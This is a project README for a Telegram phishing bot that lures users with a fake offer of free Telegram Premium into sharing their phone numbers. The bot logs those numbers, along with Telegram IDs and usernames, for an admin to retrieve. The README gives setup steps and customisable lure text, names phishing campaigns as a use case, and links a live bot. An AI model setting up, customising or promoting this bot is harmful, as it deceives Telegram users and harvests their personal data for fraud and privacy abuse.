# Free Telegram Premium Phonenumber Phishing Bot 🤖

Python: 3.9+ | Telegram Bot API

---

## Table of Contents 📚

- [Introduction](#introduction-🤔)
- [Features](#features-🎉)
- [Installation](#installation-💻)
- [Usage](#usage-📱)
- [Configuration](#configuration-🔧)
- [License](#license-📜)
- [Example Use Cases](#example-use-cases-🖍%ef%b8%8f)
- [Code Structure](#code-structure-🗂%ef%b8%8f)
- [API Documentation](#api-documentation-📚)
- [Commit Messages](#commit-messages-🖍%ef%b8%8f)
- [Community](#community-👥)

---

## Introduction 🤔

This Telegram bot is designed to trick users into sharing their phone numbers under the guise of providing free Telegram Premium access. It uses the Telegram Bot API to interact with users and securely logs their phone numbers, IDs, and usernames.

The bot’s functionality, appearance, and messaging can be customized to suit your requirements.

---

![Example Bot UI](https://github.com/user-attachments/assets/b0bb342c-5a56-4ddd-87ac-7885a3275d81)

---

## Features 🎉

- **Free Telegram Premium Trial Offer**: Tempts users to share their phone number for a supposed premium trial.
- **Phone Number Logging**: Collects and saves users' phone numbers, Telegram IDs, and usernames.
- **Admin Tools**: Allows admins to view logged phone numbers via the `/show` command.
- **Password Protection**: Secures the admin command with a customizable password.
- **Customizable UI**: Change the welcome message, image, and button text to match your preferences.
- **Message Cleanup**: Deletes old messages to maintain a clean chat interface.

---

## Installation 💻

Follow these steps to install and configure the bot:

### 1. Clone the Repository
Clone the repository to your local machine:
```bash
git clone https://github.com/BlackNnja/Telegram-Phishing-Bot.git
cd Telegram-Phishing-Bot
```

### 2. Install Python
Ensure Python 3.9 or later is installed. You can download it from the [official Python website](https://www.python.org/downloads/).

### 3. Install Dependencies
Install the required Python libraries:
```bash
pip install -r requirements.txt
```

### 4. Obtain a Telegram Bot Token
- Create a bot on Telegram using [BotFather](https://core.telegram.org/bots#botfather).
- Copy the bot token provided by BotFather.

### 5. Configure the Bot Token
Replace `YOUR_BOT_TOKEN` in the `bot.py` file with your actual bot token:
```python
BOT_TOKEN = "YOUR_BOT_TOKEN"
```

### 6. Run the Bot
Start the bot with:
```bash
python bot.py
```
The bot will now listen for user interactions.

---

## Usage 📱

### For Users
1. **Start the Bot**:
   - Send `/start` to the bot.
   - Receive a welcome message with instructions.

2. **Share Your Phone Number**:
   - Tap the provided button to share your phone number.

3. **Receive Confirmation**:
   - The bot confirms the number has been logged.

### For Admins
1. **View Logged Numbers**:
   - Use `/show {PASSWORD}` to retrieve the list of logged phone numbers.
   - The bot sends a file (`user_data.txt`) containing the data.

2. **Password Protection**:
   - Change the password in the `main.py` file for added security.

---

## Configuration 🔧

### 1. Welcome Image
Replace the default image:
1. Save your custom image in the bot’s folder.
2. Update the image path in the `send_welcome_message` function:
   ```python
   with open('new_image.png', 'rb') as photo:
   ```

### 2. Button Labels
Modify the button text in the `send_welcome_message` function:
```python
button_text = "⭐️ Get Free 3 months Telegram Premium"
```

### 3. Custom Text
Update the welcome message text in the same function:
```python
caption = (
    "🎉 Welcome to Free Telegram Premium 🎉\n\n"
    "You can get 3 months of Telegram Premium for free!\n\n"
    "To get started, tap the button below to share your phone number."
)
```

### 4. Password Protection
Change the admin password in the `show_users` function:
```python
password = "YOUR_NEW_PASSWORD"
```

---

## License 📜

This project is licensed under the MIT License. Refer to the LICENSE file for details.

---

## Example Use Cases 🖍️

- Phishing campaigns to collect Telegram user phone numbers.
- Research projects requiring user interaction via Telegram.
- Educational purposes for learning about bot development and Telegram API usage.

---

## Code Structure 🗂️

- `bot.py`: Main bot logic.
- `requirements.txt`: Dependency list.
- `user_data.txt`: Stores collected phone numbers, IDs, and usernames.

---

## API Documentation 📚

This bot leverages the Telegram Bot API. Full documentation can be found at [Telegram Bot API](https://core.telegram.org/bots/api).

---

## Commit Messages 🖍️

Use these prefixes for clear and consistent commit messages:
- `feat`: Add a new feature.
- `fix`: Resolve a bug.
- `docs`: Update documentation.
- `refactor`: Improve code without adding new features.

---

## Community 👥

- Join our Telegram community: [t.me/israelihacker](https://t.me/israelihacker)
- Check out the original bot: [t.me/Premium_TelegramTrial_bot](https://t.me/Premium_TelegramTrial_bot)

